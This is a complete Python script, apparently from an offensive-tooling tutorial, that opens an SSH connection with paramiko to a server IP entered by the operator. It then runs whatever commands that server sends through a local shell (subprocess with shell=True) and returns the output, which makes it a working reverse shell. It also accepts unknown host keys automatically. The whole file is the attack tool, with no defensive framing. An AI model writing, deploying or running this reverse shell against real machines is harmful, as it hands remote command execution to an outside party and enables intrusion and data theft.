import paramiko
import shlex
import subprocess
import getpass


def ssh_command(ip, port, user, passwd, cmd):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(ip, port=port, username=user, password=passwd)
        ssh_session = client.get_transport().open_session()

        if ssh_session.active:
            ssh_session.send(cmd)
            print(ssh_session.recv(1024).decode())

            while True:
                command = ssh_session.recv(1024)
                if not command:
                    break

                command = command.decode().strip()

                if command == "exit":
                    break
                try:
                    cmd_output = subprocess.check_output(
                        command, shell=True, stderr=subprocess.STDOUT
                    )
                    ssh_session.send(cmd_output or b"Command executed but no output.")
                except Exception as e:
                    ssh_session.send(str(e).encode())
    except Exception as e:
        print(f"[-] Connection error: {e}")
    finally:
        client.close()
        print("[*] Connection closed.")


if __name__ == "__main__":
    user = input("Username: ")
    password = getpass.getpass()
    ip = input("Enter server IP: ")
    port = input("Enter port or <CR>: ") or 22

    ssh_command(ip, port, user, password, "ClientConnected")
